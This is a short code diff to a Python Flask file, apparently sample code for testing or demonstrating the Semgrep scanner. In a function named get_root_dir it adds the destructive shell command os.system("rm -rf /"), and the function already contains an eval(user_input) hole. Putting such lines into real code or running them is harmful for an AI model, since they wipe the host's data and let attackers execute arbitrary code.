@@ -4,6 +4,7 @@ from flask import url_for
 
 def get_root_dir():
     time.sleep(3)
+    os.system("rm -rf /")
     eval(user_input)  # Semgrep will flag this as dangerous
     return os.getcwd()
 
